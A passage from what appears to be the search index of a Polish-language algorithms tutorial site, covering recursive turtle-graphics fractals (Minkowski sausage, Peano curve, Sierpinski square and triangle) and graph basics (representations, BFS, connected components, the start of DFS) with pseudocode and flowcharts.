d\u0142ugo\u015b\u0107)\n    Prawo(120)\"]\n    K2 --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/fractals/koch-snowflake/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/koch-snowflake/#c","title":"C++","text":""},{"location":"algorithms/fractals/koch-snowflake/#python","title":"Python","text":""},{"location":"algorithms/fractals/koch-snowflake/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/minkowski-sausage/","title":"Minkowski Sausage","text":"<p>Minkowski Sausage, znana r\u00f3wnie\u017c jako Krzywa Minkowskiego lub Wyspa Minkowskiego, jest rodzajem krzywej fraktalnej. Jest konstruowana poprzez rekursywne modyfikowanie odcinka linii w bardziej z\u0142o\u017cony kszta\u0142t. W ka\u017cdej iteracji ka\u017cdy odcinek linii jest zast\u0119powany seri\u0105 mniejszych segment\u00f3w, kt\u00f3re tworz\u0105 wz\u00f3r zygzakowaty. Ten proces zwi\u0119ksza z\u0142o\u017cono\u015b\u0107 i szczeg\u00f3\u0142owo\u015b\u0107 fraktala z ka\u017cdym krokiem, co skutkuje kszta\u0142tem wykazuj\u0105cym samopodobie\u0144stwo i skomplikowane wzory na ka\u017cdej skali.</p>"},{"location":"algorithms/fractals/minkowski-sausage/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/minkowski-sausage/#dane","title":"Dane","text":"<ul> <li>stopie\u0144 - stopie\u0144 fraktala</li> <li>d\u0142ugo\u015b\u0107 - pocz\u0105tkowa d\u0142ugo\u015b\u0107 linii</li> </ul>"},{"location":"algorithms/fractals/minkowski-sausage/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/minkowski-sausage/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura MinkowskiSausage(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n        3. Zako\u0144cz\n    4. Prawo(30)\n    5. MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    6. Lewo(90)\n    7. MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    8. Prawo(90)\n    9. MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    10. Lewo(30)\n</code></pre>"},{"location":"algorithms/fractals/minkowski-sausage/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MinkowskiSausage(stopie\u0144, d\u0142ugo\u015b\u0107\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[\"Prawo(30)\n    MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Lewo(90)\n    MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Prawo(90)\n    MinkowskiSausage(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Lewo(30)\"]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/fractals/minkowski-sausage/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/minkowski-sausage/#c","title":"C++","text":""},{"location":"algorithms/fractals/minkowski-sausage/#python","title":"Python","text":""},{"location":"algorithms/fractals/minkowski-sausage/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/peano-curve/","title":"Krzywa Peano","text":"<p>Krzywa Peano, znana r\u00f3wnie\u017c jako krzywa Peano-Gospera, jest przyk\u0142adem fraktala, kt\u00f3ry wype\u0142nia przestrze\u0144. Zosta\u0142a odkryta przez w\u0142oskiego matematyka Giuseppe Peano w 1890 roku. Krzywa ta jest konstrukcj\u0105, kt\u00f3ra w spos\u00f3b ci\u0105g\u0142y przechodzi przez ka\u017cdy punkt w jednostkowym kwadracie, tworz\u0105c samopodobn\u0105 struktur\u0119.  Jest to jeden z pierwszych przyk\u0142ad\u00f3w krzywej, kt\u00f3ra wype\u0142nia przestrze\u0144, co oznacza, \u017ce jej wymiar fraktalny wynosi 2.</p>"},{"location":"algorithms/fractals/peano-curve/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/peano-curve/#dane","title":"Dane","text":"<ul> <li>stopie\u0144 - stopie\u0144 fraktala</li> <li>k\u0105t - k\u0105t obrotu</li> <li>d\u0142ugo\u015b\u0107 - d\u0142ugo\u015b\u0107 linii</li> </ul>"},{"location":"algorithms/fractals/peano-curve/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Krzywa Peano o stopniu \\(4\\) i k\u0105cie \\(90\\degree\\).</p> <p></p>"},{"location":"algorithms/fractals/peano-curve/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Krzywa Peano o stopniu \\(4\\) i k\u0105cie \\(60\\degree\\).</p> <p></p>"},{"location":"algorithms/fractals/peano-curve/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/peano-curve/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura KrzywaPeano(stopie\u0144, k\u0105t, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Zako\u0144cz\n    3. Prawo(k\u0105t)\n    4. KrzywaPeano(stopie\u0144 - 1, -k\u0105t, d\u0142ugo\u015b\u0107)\n    5. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    6. KrzywaPeano(stopie\u0144 - 1, k\u0105t, d\u0142ugo\u015b\u0107)\n    7. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    8. KrzywaPeano(stopie\u0144 - 1, -k\u0105t, d\u0142ugo\u015b\u0107)\n    9. Lewo(k\u0105t)\n</code></pre>"},{"location":"algorithms/fractals/peano-curve/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"KrzywaPeano(stopie\u0144, k\u0105t, d\u0142ugo\u015b\u0107\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\"]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[\"Prawo(k\u0105t)\n    KrzywaPeano(stopie\u0144 - 1, -k\u0105t, d\u0142ugo\u015b\u0107)\n    Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    KrzywaPeano(stopie\u0144 - 1, k\u0105t, d\u0142ugo\u015b\u0107)\n    Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    KrzywaPeano(stopie\u0144 - 1, -k\u0105t, d\u0142ugo\u015b\u0107)\n    Lewo(k\u0105t)\"]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/fractals/peano-curve/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/peano-curve/#c","title":"C++","text":""},{"location":"algorithms/fractals/peano-curve/#python","title":"Python","text":""},{"location":"algorithms/fractals/peano-curve/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/sierpinski-square/","title":"Kwadrat Sierpi\u0144skiego","text":"<p>Kwadrat Sierpi\u0144skiego (inaczej Dywan Sierpi\u0144skiego), to fraktal podobny do Tr\u00f3jk\u0105ta Sierpi\u0144skiego. G\u0142\u00f3wna r\u00f3\u017cnica jest taka, \u017ce podstawow\u0105 figur\u0105 jest kwadrat.</p>"},{"location":"algorithms/fractals/sierpinski-square/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/sierpinski-square/#dane","title":"Dane","text":"<ul> <li>stopie\u0144 - stopie\u0144 kwadratu Sierpi\u0144skiego</li> <li>d\u0142ugo\u015b\u0107 - d\u0142ugo\u015b\u0107 boku g\u0142\u00f3wnego kwadratu</li> </ul>"},{"location":"algorithms/fractals/sierpinski-square/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/sierpinski-square/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura KwadratSierpi\u0144skiego(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Dla i := 1 do 4, wykonuj:\n            3. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n            4. Lewo(90)\n        5. Zako\u0144cz\n    6. Dla i := 1 do 4, wykonuj:\n        7. Dla j := 1 do 2, wykonuj:\n            8. Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n            9. KwadratSierpi\u0144skiego(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\n        10. Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n        11. Lewo(90)\n</code></pre>"},{"location":"algorithms/fractals/sierpinski-square/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"KwadratSierpi\u0144skiego(stopie\u0144, d\u0142ugo\u015b\u0107)\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2p[i := 1]\n    K2p --&gt; K2{i &lt;= 4}\n    K2 -- PRAWDA --&gt; K3[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    Lewo(90)\"]\n    K3 --&gt; K2i[i := i + 1]\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K6p[i := 1]\n    K6p --&gt; K6{i &lt;= 4}\n    K6 -- PRAWDA --&gt; K7p[j := 1]\n    K7p --&gt; K7{j &lt;= 2}\n    K7 -- PRAWDA --&gt; K8[\"Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n    KwadratSierpi\u0144skiego(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 3)\"]\n    K8 --&gt; K7i[j := j + 1]\n    K7i --&gt; K7\n    K7 -- FA\u0141SZ --&gt; K10[\"Prz\u00f3d(d\u0142ugo\u015b\u0107 / 3)\n    Lewo(90)\"]\n    K10 --&gt; K6i[i := i + 1]\n    K6i --&gt; K6\n    K6 -- FA\u0141SZ ---&gt; STOP</code></pre>"},{"location":"algorithms/fractals/sierpinski-square/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/sierpinski-square/#c","title":"C++","text":""},{"location":"algorithms/fractals/sierpinski-square/#python","title":"Python","text":""},{"location":"algorithms/fractals/sierpinski-square/#blockly","title":"Blockly","text":""},{"location":"algorithms/fractals/sierpinski-triangle/","title":"Tr\u00f3jk\u0105t Sierpi\u0144skiego","text":"<p>Tr\u00f3jk\u0105t Sierpi\u0144skiego to jeden z popularniejszych fraktali, kt\u00f3ry jest stosunkowo prosty do wygenerowania, czy nawet do r\u0119cznego narysowania na kartce papieru. Podstawow\u0105 figur\u0105 w tym fraktalu jest, jak nazwa wskazuje, tr\u00f3jk\u0105t. Fraktal powstaje poprzez narysowanie w ka\u017cdym rogu tr\u00f3jk\u0105ta nowych, mniejszych tr\u00f3jk\u0105t\u00f3w z bokiem o po\u0142ow\u0119 kr\u00f3tszym. Procedur\u0119 powtarzamy, w ka\u017cdym z tych tr\u00f3jk\u0105t\u00f3w post\u0119puj\u0105c w identyczny spos\u00f3b. </p> <p>Przyjrzyj si\u0119 poni\u017cszej prezentacji, by lepiej zrozumie\u0107 t\u0119 procedur\u0119.</p>"},{"location":"algorithms/fractals/sierpinski-triangle/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/fractals/sierpinski-triangle/#dane","title":"Dane","text":"<ul> <li>\\(stopie\u0144\\) - stopie\u0144 tr\u00f3jk\u0105ta</li> <li>\\(d\u0142ugo\u015b\u0107\\) - pocz\u0105tkowa d\u0142ugo\u015b\u0107</li> </ul>"},{"location":"algorithms/fractals/sierpinski-triangle/#wynik","title":"Wynik","text":"<ul> <li>Tr\u00f3jk\u0105t Sierpi\u0144skiego stopnia \\(stopie\u0144\\) i pocz\u0105tkowej d\u0142ugo\u015bci \\(d\u0142ugo\u015b\u0107\\).</li> </ul>"},{"location":"algorithms/fractals/sierpinski-triangle/#prezentacja","title":"Prezentacja","text":"<p> Tr\u00f3jk\u0105t Sierpi\u0144skiego - wprowadzenie</p>"},{"location":"algorithms/fractals/sierpinski-triangle/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/fractals/sierpinski-triangle/#prezentacja_1","title":"Prezentacja","text":"<p> Tr\u00f3jk\u0105t Sierpi\u0144skiego - algorytm</p>"},{"location":"algorithms/fractals/sierpinski-triangle/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura Tr\u00f3jk\u0105tSierpi\u0144skiego(stopie\u0144, d\u0142ugo\u015b\u0107):\n    1. Je\u017celi stopie\u0144 = 0, to:\n        2. Dla i := 1 do 3, wykonuj:\n            3. Prz\u00f3d(d\u0142ugo\u015b\u0107)\n            4. Lewo(120)\n        5. Zako\u0144cz\n    6. Dla i := 1 do 3, wykonuj:\n        7. Tr\u00f3jk\u0105tSierpi\u0144skiego(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n        8. Prz\u00f3d(d\u0142ugo\u015b\u0107 / 2)\n        9. Lewo(120)\n</code></pre>"},{"location":"algorithms/fractals/sierpinski-triangle/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Tr\u00f3jk\u0105tSierpi\u0144skiego(stopie\u0144, d\u0142ugo\u015b\u0107)\"]) --&gt; K1{stopie\u0144 = 0}\n    K1 -- PRAWDA --&gt; K2p[i := 1]\n    K2p --&gt; K2{i &lt;= 3}\n    K2 -- PRAWDA --&gt; K3[\"Prz\u00f3d(d\u0142ugo\u015b\u0107)\n    Lewo(120)\"]\n    K3 --&gt; K2i[i := i + 1]\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K6p[i := 1]\n    K6p --&gt; K6{i &lt;= 3}\n    K6 -- PRAWDA --&gt; K7[\"Tr\u00f3jk\u0105tSierpi\u0144skiego(stopie\u0144 - 1, d\u0142ugo\u015b\u0107 / 2)\n    Prz\u00f3d(d\u0142ugo\u015b\u0107 / 2)\n    Lewo(120)\"]\n    K7 --&gt; K6i[i := i + 1]\n    K6i --&gt; K6\n    K6 -- FA\u0141SZ ---&gt; STOP</code></pre>"},{"location":"algorithms/fractals/sierpinski-triangle/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/fractals/sierpinski-triangle/#c","title":"C++","text":""},{"location":"algorithms/fractals/sierpinski-triangle/#python","title":"Python","text":""},{"location":"algorithms/fractals/sierpinski-triangle/#blockly","title":"Blockly","text":""},{"location":"algorithms/graphs/","title":"Grafy","text":"<p>Graf jest struktur\u0105 danych, kt\u00f3ra sk\u0142ada si\u0119 z wierzcho\u0142k\u00f3w (lub w\u0119z\u0142\u00f3w) po\u0142\u0105czonych kraw\u0119dziami. Ka\u017cda kraw\u0119d\u017a \u0142\u0105czy par\u0119 wierzcho\u0142k\u00f3w. Grafy mog\u0105 by\u0107 skierowane (kraw\u0119dzie maj\u0105 kierunek) lub nieskierowane (kraw\u0119dzie nie maj\u0105 okre\u015blonego kierunku).</p> <p>Grafy s\u0105 niezwykle u\u017cyteczne w wielu dziedzinach, takich jak sieci komputerowe, algorytmy przeszukiwania \u015bcie\u017cek, przetwarzanie obraz\u00f3w, sieci spo\u0142eczno\u015bciowe i wiele innych.</p>"},{"location":"algorithms/graphs/#typy-grafow","title":"Typy graf\u00f3w","text":"<p>Istnieje kilka podstawowych typ\u00f3w graf\u00f3w, a ka\u017cdy ma swoje zastosowania.</p> <ul> <li>Graf nieskierowany: Graf, w kt\u00f3rym kraw\u0119dzie nie maj\u0105 kierunku. Je\u015bli istnieje kraw\u0119d\u017a mi\u0119dzy wierzcho\u0142kami \\(A\\) i \\(B\\), to mo\u017cna porusza\u0107 si\u0119 z \\(A\\) do \\(B\\) i z \\(B\\) do \\(A\\).</li> <li>Graf skierowany: Graf, w kt\u00f3rym kraw\u0119dzie maj\u0105 kierunek. Je\u015bli istnieje kraw\u0119d\u017a z \\(A\\) do \\(B\\), to nie mo\u017cna porusza\u0107 si\u0119 z \\(B\\) do \\(A\\), chyba \u017ce istnieje tam osobna kraw\u0119d\u017a.</li> <li>Graf wa\u017cony: Graf, w kt\u00f3rym kraw\u0119dzie maj\u0105 warto\u015b\u0107 (wag\u0119) przypisan\u0105. Te wagi mog\u0105 reprezentowa\u0107 r\u00f3\u017cne rzeczy, takie jak koszt, d\u0142ugo\u015b\u0107, pojemno\u015b\u0107 itp., w zale\u017cno\u015bci od problemu, kt\u00f3ry pr\u00f3bujemy rozwi\u0105za\u0107.</li> <li>Graf niewa\u017cony: Graf, w kt\u00f3rym kraw\u0119dzie nie maj\u0105 przypisanej warto\u015bci.</li> </ul>"},{"location":"algorithms/graphs/#reprezentacje-grafu","title":"Reprezentacje grafu","text":"<p>Aby m\u00f3c efektywnie pracowa\u0107 z grafami i wykorzystywa\u0107 je w algorytmice, potrzebne nam s\u0105 struktury do ich efektywnej reprezentacji i przechowywania w pami\u0119ci programu/komputera. Zazwyczaj rozwa\u017camy trzy podstawowe sposoby reprezentacji grafu:</p> <ul> <li>Macierz s\u0105siedztwa: Jest to kwadratowa macierz o wymiarach \\(N\\times N\\), gdzie \\(N\\) to liczba wierzcho\u0142k\u00f3w w grafie. Element macierzy \\(M[i][j]\\) jest r\u00f3wny \\(1\\), je\u015bli istnieje kraw\u0119d\u017a mi\u0119dzy wierzcho\u0142kami \\(i\\) oraz \\(j\\), a w przeciwnym razie jest r\u00f3wny \\(0\\). W przypadku graf\u00f3w wa\u017conych warto\u015bci te zast\u0119puje waga kraw\u0119dzi. Macierz s\u0105siedztwa jest prosta do zrozumienia i implementacji, ale jest nieefektywna dla graf\u00f3w rzadkich (tzn. z ma\u0142\u0105 liczb\u0105 kraw\u0119dzi), poniewa\u017c wymaga przechowywania \\(N^2\\) warto\u015bci.</li> <li>Lista s\u0105siedztwa: Jest to alternatywna reprezentacja grafu, kt\u00f3ra jest bardziej efektywna dla graf\u00f3w rzadkich. Dla ka\u017cdego wierzcho\u0142ka przechowuje list\u0119 wierzcho\u0142k\u00f3w, do kt\u00f3rych prowadzi kraw\u0119d\u017a. W praktyce lista s\u0105siedztwa mo\u017ce by\u0107 reprezentowana jako tablica list lub jako s\u0142ownik, gdzie klucze to wierzcho\u0142ki, a warto\u015bci to listy s\u0105siednich wierzcho\u0142k\u00f3w.</li> <li>Lista kraw\u0119dzi: Lista kraw\u0119dzi to inna forma reprezentacji grafu, w kt\u00f3rej graf jest reprezentowany jako jedna lista wszystkich kraw\u0119dzi. Ka\u017cda kraw\u0119d\u017a jest reprezentowana jako para wierzcho\u0142k\u00f3w \\((i, j)\\). Lista kraw\u0119dzi jest szczeg\u00f3lnie przydatna, gdy chcemy przej\u015b\u0107 przez wszystkie kraw\u0119dzie grafu.</li> </ul>"},{"location":"algorithms/graphs/#operacje-na-grafach","title":"Operacje na grafach","text":"<p>Podstawowe operacje, kt\u00f3re mo\u017cna wykona\u0107 na grafach, to:</p> <ul> <li>dodawanie wierzcho\u0142k\u00f3w, </li> <li>dodawanie kraw\u0119dzi, </li> <li>usuwanie wierzcho\u0142k\u00f3w, </li> <li>usuwanie kraw\u0119dzi, </li> <li>sprawdzanie, czy istnieje kraw\u0119d\u017a mi\u0119dzy dwoma wierzcho\u0142kami, </li> <li>sprawdzanie s\u0105siad\u00f3w danego wierzcho\u0142ka.</li> </ul>"},{"location":"algorithms/graphs/#podsumowanie","title":"Podsumowanie","text":"<p>Grafy s\u0105 kluczow\u0105 struktur\u0105 danych wykorzystywan\u0105 w wielu dziedzinach informatyki, a r\u00f3\u017cne sposoby reprezentacji graf\u00f3w pozwalaj\u0105 na optymalizacj\u0119 r\u00f3\u017cnych operacji. Wyb\u00f3r odpowiedniego typu grafu i reprezentacji zale\u017cy od specyfiki problemu, kt\u00f3ry pr\u00f3bujemy rozwi\u0105za\u0107 i cz\u0119sto jest kluczowym elementem wydajnego algorytmu.</p>"},{"location":"algorithms/graphs/bfs/","title":"BFS","text":"<p>BFS (Breadth First Search) to algorytm przeszukiwania grafu, kt\u00f3ry przeszukuje wierzcho\u0142ki w kolejno\u015bci ich odleg\u0142o\u015bci od \u017ar\u00f3d\u0142a, odwiedzaj\u0105c najpierw wierzcho\u0142ki bezpo\u015brednio s\u0105siaduj\u0105ce ze \u017ar\u00f3d\u0142em, nast\u0119pnie wierzcho\u0142ki, kt\u00f3re s\u0105 dwa kroki od \u017ar\u00f3d\u0142a, i tak dalej.</p>"},{"location":"algorithms/graphs/bfs/#opis-dziaania-algorytmu","title":"Opis dzia\u0142ania algorytmu","text":"<p>BFS zaczyna od wybranego wierzcho\u0142ka (zwanego wierzcho\u0142kiem \u017ar\u00f3d\u0142owym/pocz\u0105tkowym) i odwiedza wszystkie wierzcho\u0142ki na tym samym poziomie (czyli w tej samej odleg\u0142o\u015bci od wierzcho\u0142ka \u017ar\u00f3d\u0142owego) przed przej\u015bciem do nast\u0119pnego poziomu. W praktyce oznacza to, \u017ce algorytm BFS \"rozszerza\" si\u0119 na wszystkie kierunki jednocze\u015bnie, co jest u\u017cyteczne w takich zastosowaniach jak znajdowanie najkr\u00f3tszej \u015bcie\u017cki w grafie niewa\u017conym.</p>"},{"location":"algorithms/graphs/bfs/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja BFS(G, s):   (G - graf, s - wierzcho\u0142ek startowy)\n    1. Utw\u00f3rz kolejk\u0119 Q\n    2. Umie\u015b\u0107 s w kolejce Q\n    3. Oznacz s jako odwiedzone\n    4. Dop\u00f3ki kolejka Q nie jest pusta, wykonuj:\n        5. Usu\u0144 pierwszy element z kolejki Q i zapisz w zmiennej v\n        6. Dla ka\u017cdego wierzcho\u0142ka u s\u0105siaduj\u0105cego z v, wykonuj:\n            7. Je\u017celi u nie jest odwiedzony, to:\n                8. Oznacz u jako odwiedzony\n                9. Umie\u015b\u0107 u w kolejce Q\n</code></pre>"},{"location":"algorithms/graphs/bfs/#zastosowania","title":"Zastosowania","text":"<p>BFS ma wiele zastosowa\u0144 w praktyce, mi\u0119dzy innymi:</p> <ul> <li>Wyszukiwanie elementu w grafie.</li> <li>Wyszukiwanie najkr\u00f3tszej \u015bcie\u017cki w grafie niewa\u017conym.</li> <li>Sprawdzanie, czy graf jest sp\u00f3jny.</li> <li>Wyszukiwanie cykli w grafie.</li> <li>Rozwi\u0105zywanie problem\u00f3w takich jak problem labiryntu, problem \u015bcie\u017cki Hamiltona itp.</li> </ul>"},{"location":"algorithms/graphs/bfs/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu BFS wynosi \\(O(V + E)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w, a \\(E\\) to liczba kraw\u0119dzi, poniewa\u017c ka\u017cdy wierzcho\u0142ek i ka\u017cda kraw\u0119d\u017a s\u0105 przeszukiwane dok\u0142adnie raz.</p>"},{"location":"algorithms/graphs/bfs/#implementacja","title":"Implementacja","text":"<p>Algorytm BFS jest zwykle implementowany za pomoc\u0105 struktury danych zwan\u0105 kolejk\u0105, kt\u00f3ra zachowuje wierzcho\u0142ki do odwiedzenia. Pocz\u0105tkowo, wierzcho\u0142ek startowy jest dodawany do kolejki. Nast\u0119pnie, dop\u00f3ki kolejka nie jest pusta, wierzcho\u0142ek jest usuwany z kolejki, a wszystkie jego niewizytowane s\u0105siednie wierzcho\u0142ki s\u0105 dodawane do kolejki. Operacje s\u0105 powtarzane, a\u017c kolejka zostanie opr\u00f3\u017cniona.</p> <p>Poni\u017cej znajdziesz przyk\u0142adowe implementacje w wybranych j\u0119zykach.</p>"},{"location":"algorithms/graphs/bfs/#c","title":"C++","text":""},{"location":"algorithms/graphs/bfs/#python","title":"Python","text":""},{"location":"algorithms/graphs/connected-components/","title":"Sp\u00f3jne sk\u0142adowe","text":"<p>Sp\u00f3jna sk\u0142adowa w grafie to taki podzbi\u00f3r wierzcho\u0142k\u00f3w, \u017ce mi\u0119dzy dowolnymi dwoma wierzcho\u0142kami z tego podzbioru istnieje \u015bcie\u017cka. W przypadku grafu nieskierowanego, m\u00f3wimy, \u017ce jest sp\u00f3jny, je\u015bli istnieje tylko jedna sp\u00f3jna sk\u0142adowa, czyli je\u015bli istnieje \u015bcie\u017cka mi\u0119dzy ka\u017cd\u0105 par\u0105 wierzcho\u0142k\u00f3w. W przypadku graf\u00f3w skierowanych poj\u0119cie to rozwija si\u0119 do silnej sp\u00f3jno\u015bci, gdzie musi istnie\u0107 \u015bcie\u017cka w obu kierunkach mi\u0119dzy ka\u017cd\u0105 par\u0105 wierzcho\u0142k\u00f3w.</p>"},{"location":"algorithms/graphs/connected-components/#obliczanie-liczby-spojnych-skadowych","title":"Obliczanie liczby sp\u00f3jnych sk\u0142adowych","text":"<p>Algorytm do obliczania liczby sp\u00f3jnych sk\u0142adowych w grafie zazwyczaj opiera si\u0119 na jednym z dw\u00f3ch podstawowych algorytm\u00f3w przeszukiwania grafu: przeszukiwania wszerz (BFS) lub przeszukiwania w g\u0142\u0105b (DFS).</p> <p>Przyjrzyjmy si\u0119, jak wygl\u0105da algorytm wykorzystuj\u0105cy metod\u0119 DFS do obliczania liczby sp\u00f3jnych sk\u0142adowych:</p> <ol> <li>Inicjalizacja: Na pocz\u0105tku wszystkie wierzcho\u0142ki s\u0105 nieodwiedzone.</li> <li>Wybieramy dowolny nieodwiedzony wierzcho\u0142ek i rozpoczynamy od niego przeszukiwanie w g\u0142\u0105b (DFS).</li> <li>Po zako\u0144czeniu przeszukiwania w g\u0142\u0105b z danego wierzcho\u0142ka, wszystkie wierzcho\u0142ki, kt\u00f3re odwiedzili\u015bmy, nale\u017c\u0105 do tej samej sp\u00f3jnej sk\u0142adowej. Oznaczamy te wierzcho\u0142ki jako odwiedzone.</li> <li>Zwi\u0119kszamy licznik sp\u00f3jnych sk\u0142adowych o \\(1\\).</li> <li>Powtarzamy kroki \\(2\\)-\\(4\\), dop\u00f3ki wszystkie wierzcho\u0142ki nie zostan\u0105 odwiedzone.</li> </ol> <p>Podobny algorytm mo\u017cna r\u00f3wnie\u017c opracowa\u0107 z u\u017cyciem BFS zamiast DFS. Przy odpowiedniej implementacji wystarczy zamieni\u0107 wykorzystywan\u0105 struktur\u0119 danych (ze stosu na kolejk\u0119).</p>"},{"location":"algorithms/graphs/connected-components/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Z\u0142o\u017cono\u015b\u0107 obliczeniowa tego algorytmu to \\(O(V+E)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w, a \\(E\\) to liczba kraw\u0119dzi w grafie. Jest to z\u0142o\u017cono\u015b\u0107 typowego przeszukiwania grafu (DFS lub BFS).</p>"},{"location":"algorithms/graphs/connected-components/#zastosowania","title":"Zastosowania","text":"<p>Obliczanie liczby sp\u00f3jnych sk\u0142adowych w grafie jest podstawowym zagadnieniem w teorii graf\u00f3w. Jest niezb\u0119dne w wielu aplikacjach, takich jak analiza sieci spo\u0142eczno\u015bciowych, identyfikacja klastr\u00f3w w danych lub wykrywanie sk\u0142adowych niezale\u017cnych w sieci komputerowej.</p>"},{"location":"algorithms/graphs/connected-components/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/connected-components/#c","title":"C++","text":""},{"location":"algorithms/graphs/connected-components/#python","title":"Python","text":""},{"location":"algorithms/graphs/dfs/","title":"DFS","text":"<p>DFS (Depth First Search) to jeden z podstawowych algorytm\u00f3w przeszukiwania grafu. Jak sama nazwa wskazuje, algorytm ten skupia si\u0119 na przechodzeniu w g\u0142\u0105b, co sprowadza si\u0119 do zbadania jak najwi\u0119kszej liczby kraw\u0119dzi wzd\u0142u\u017c ka\u017cdej mo\u017cliwej \u015bcie\u017cki przed powrotem i eksploracj\u0105 innych \u015bcie\u017cek.</p> <p>DFS jest cz\u0119sto wykorzystywany do rozwi\u0105zywania r\u00f3\u017cnego rodzaju problem\u00f3w, takich jak sprawdzanie czy graf jest sp\u00f3jny, szukanie cykli czy rozwi\u0105zanie problemu \u015bcie\u017cki Hamiltona.</p>"},{"location":"algorithms/graphs/dfs/#opis-dziaania-algorytmu","title":"Opis dzia\u0142ania algorytmu","text":"<p>DFS zaczyna od wybranego wierzcho\u0142ka (zwanego wierzcho\u0142kiem \u017ar\u00f3d\u0142owym/pocz\u0105tkowym) i wykonuje przeszukiwanie mo\u017cliwie najdalej wzd\u0142u\u017c ka\u017cdej ga\u0142\u0119zi grafu, zanim wr\u00f3ci do poprzedniego wierzcho\u0142ka i spr\u00f3buje przeszuka\u0107 kolejn\u0105 \u015bcie\u017ck\u0119. G\u0142\u00f3wnym celem algorytmu jest odwiedzenie ka\u017cdego wierzcho\u0142ka grafu dok\u0142adnie raz.</p>"},{"location":"algorithms/graphs/dfs/#prezentacja","title":"Prezentacja","text":"<p> Przebieg algorytmu DFS - prezentacja</p>"},{"location":"algorithms/graphs/dfs/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja DFS(G, s):   (G - graf, v - wierzcho\u0142ek startowy)\n    1. 